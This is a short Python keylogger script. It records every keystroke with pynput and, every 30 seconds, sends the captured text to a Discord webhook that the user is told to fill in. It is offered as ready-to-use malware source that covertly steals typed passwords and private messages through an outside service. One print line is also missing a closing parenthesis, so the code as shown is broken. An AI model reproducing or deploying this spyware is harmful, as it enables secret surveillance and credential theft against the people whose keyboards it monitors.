import time
from pynput import keyboard
import threading
import requests

# Webhook URL
WEBHOOK_URL = "Webhook-URL"  #Add your discord webhook URL 

pressed_keys = []

# Function to send the keys to Discord webhook
def send_to_discord():
    global pressed_keys
    while True:
        time.sleep(30)  # Change the time according to your wish
        
        if pressed_keys:
            content = ''.join(pressed_keys)
            payload = {'content': content}
            response = requests.post(WEBHOOK_URL, data=payload)
            
            if response.status_code == 204:
                print("Keys sent to Discord!")
            else:
                print(f"Failed to send keys: {response.status_code}"
            pressed_keys = []

def on_press(key):
    global pressed_keys
    try:
        pressed_keys.append(key.char)
    except AttributeError:
        pressed_keys.append(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

thread = threading.Thread(target=send_to_discord)
thread.daemon = True
thread.start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
